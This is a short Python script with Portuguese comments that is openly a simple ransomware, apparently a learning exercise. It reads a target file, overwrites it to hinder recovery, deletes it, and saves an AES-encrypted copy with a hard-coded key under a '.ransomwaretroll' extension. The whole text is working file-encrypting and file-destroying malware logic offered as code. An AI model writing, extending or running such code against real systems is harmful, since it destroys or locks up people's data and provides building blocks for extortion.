import os
import sys
import pyaes

# Pega o caminho do arquivo atraves do argumento passado 
if len(sys.argv) > 1:
    file_path = sys.argv[1]

# Usa o arquivo padrão
else:
    file_path = 'teste.txt'

# Abre e le o conteudo do arquivo
file = open(file_path, 'r+')
file_data = file.read()

# Zera os dados do arquivo para nao ser recuperado pelo sistema de arquivos
file.write('@' * os.path.getsize(file_path))
file.close()

# Deleta o arquivo
os.remove(file_path)

# Define a chave de criptografia
key = b'testeransomwares'
aes = pyaes.AESModeOfOperationCTR(key)

data_crypt = aes.encrypt(file_data)

# Cria o arquivo criptografado
new_file_path = file_path + '.ransomwaretroll'
new_file = open(f'{new_file_path}', 'wb')
new_file.write(data_crypt)
new_file.close()
